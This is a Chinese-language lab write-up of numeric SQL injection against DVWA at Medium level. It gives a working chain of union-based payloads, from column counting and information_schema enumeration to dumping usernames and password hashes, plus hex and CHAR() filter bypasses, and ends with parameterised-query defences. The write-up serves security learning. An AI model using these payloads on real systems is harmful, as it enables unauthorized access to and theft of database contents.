# DVWA SQL Injection (Medium)

## 实验环境

* Kali Linux
* DVWA
* Burp Suite
* Security Level：Medium

---

## 漏洞简介

在DVWA Medium级别中，开发者尝试通过过滤用户输入来防御SQL注入攻击。

与Low级别相比，页面不再直接接收GET请求参数，而是通过POST方式提交数据。同时后端代码对部分特殊字符进行了过滤处理。

然而，用户输入仍然直接拼接到SQL语句中，因此系统依然存在SQL注入漏洞。

---

## 源码分析

Medium级别核心代码如下：

```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

$query = "SELECT first_name, last_name
FROM users
WHERE user_id = $id;";
```

与Low级别相比：

* 增加了输入过滤；
* 查询语句中的用户输入不再使用单引号包裹；
* 用户输入仍然直接参与SQL语句拼接。

正常执行的SQL语句如下：

```sql
SELECT first_name,last_name
FROM users
WHERE user_id = 1;
```

由于输入内容直接进入SQL语句，因此攻击者仍然可以构造恶意SQL语句改变查询逻辑。

---

## 漏洞原理

Medium级别虽然对部分特殊字符进行了处理，但后端依旧采用字符串拼接方式构造SQL语句。

SQL注入是否能够成功，关键并不在于过滤了哪些字符，而在于：

* 用户输入是否直接参与SQL语句构造；
* 用户输入是否被数据库解释为SQL代码执行。

只要用户输入能够影响SQL语句结构，就仍然可能存在SQL注入风险。

---

## 漏洞利用过程

### 1. 判断注入类型

首先开启Burp Suite拦截功能。

登录DVWA后进入SQL Injection模块。

选择任意用户ID并提交请求。

将请求发送至Repeater进行测试。

---

### 2. 测试单引号

Payload：

```sql
1'
```

服务器返回错误信息。

说明应用对单引号进行了过滤处理。

---

### 3. 测试逻辑语句

Payload：

```sql
1 or 1=1
```

返回所有用户信息。

说明：

* 用户输入仍然参与SQL语句解析；
* 存在数字型SQL注入漏洞。

---

### 4. 判断字段数量

Payload：

```sql
1 order by 1
```

```sql
1 order by 2
```

```sql
1 order by 3
```

测试结果表明：

```sql
order by 1
```

和：

```sql
order by 2
```

执行正常。

而：

```sql
order by 3
```

出现错误。

说明当前查询结果包含2个字段。

---

### 5. 确定回显位

Payload：

```sql
1 union select 1,2
```

页面成功显示：

```text
1
2
```

说明两个字段均可作为回显位使用。

---

### 6. 获取数据库信息

获取数据库名称：

```sql
1 union select database(),2
```

返回：

```text
dvwa
```

---

获取数据库版本：

```sql
1 union select version(),2
```

成功获得数据库版本信息。

---

### 7. 获取数据表名称

Payload：

```sql
1 union select table_name,2
from information_schema.tables
where table_schema=0x64767761
```

其中：

```text
0x64767761
```

为字符串：

```text
dvwa
```

对应的十六进制表示。

成功获取数据库中的表名信息。

---

### 8. 获取字段名称

Payload：

```sql
1 union select column_name,2
from information_schema.columns
where table_name=0x7573657273
```

其中：

```text
0x7573657273
```

对应字符串：

```text
users
```

成功获取字段信息。

---

### 9. 获取用户数据

Payload：

```sql
1 union select user,password
from users
```

成功获取数据库中的用户名及密码信息。

---

## 绕过方式分析

由于Medium级别对部分特殊字符进行了处理，因此在某些场景下需要绕过引号限制。

常见方法包括：

### 十六进制编码

例如：

```text
dvwa
```

转换为：

```text
0x64767761
```

---

### CHAR()函数构造字符串

例如：

```sql
char(100,118,119,97)
```

对应：

```text
dvwa
```

---

这两种方式在需要绕过字符串过滤时均可使用。

---

## 漏洞形成原因

漏洞产生的根本原因并非过滤机制不足，而是：

* 用户输入直接拼接进入SQL语句；
* 用户输入被数据库当作SQL代码执行；
* 未采用参数化查询。

因此攻击者能够通过构造恶意输入控制数据库查询逻辑。

---

## 防御措施

### 参数化查询

推荐采用Prepared Statement实现参数化处理。

示例：

```php
$stmt = $pdo->prepare(
    "SELECT first_name,last_name FROM users WHERE user_id=?"
);

$stmt->execute([$id]);
```

---

### 输入校验

* 类型检查
* 长度限制
* 白名单机制

---

### 最小权限原则

数据库账户仅授予必要权限，降低漏洞利用后的危害范围。

---

## 学习总结

通过DVWA Medium级别实验，进一步理解了数字型SQL注入的利用方式。

与Low级别相比，Medium级别增加了部分输入过滤，但由于后端仍采用字符串拼接方式构造SQL语句，因此漏洞依然存在。

本实验进一步掌握了：

* 数字型SQL注入原理；
* UNION联合查询利用；
* information_schema数据库信息枚举；
* 十六进制编码绕过；
* CHAR()函数绕过；

同时也更加理解了SQL注入防御的核心在于参数化查询，而不是简单的字符过滤。
